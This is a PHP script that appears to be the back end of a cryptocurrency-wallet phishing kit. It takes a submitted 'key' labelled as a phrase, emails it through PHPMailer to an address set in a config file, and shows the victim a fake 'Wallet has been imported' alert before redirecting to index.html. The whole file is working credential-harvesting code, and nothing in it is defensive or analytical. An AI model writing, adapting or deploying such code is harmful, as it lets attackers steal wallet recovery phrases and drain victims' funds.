
    <?php 
	
	include 'config.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

if (isset($_POST['import'])) {
	$key = trim($_POST['key']);
    if (!empty($key)) {
      require_once "PHPMailer/PHPMailer.php";
      require_once 'PHPMailer/Exception.php';

      $mail= new PHPMailer();
      $mail->setFrom($username);
      $mail->FromName = $domainName;
      $mail->addAddress($send_to);
      $mail->Subject = " Phrase";
      $mail->isHTML(true);
      $mail->Body = ' Phrase - '.$key.' ';
      $mail->send();

      echo "<script>alert('Wallet has been imported'); window.location.href = 'index.html'</script>";
    }
	
}

?>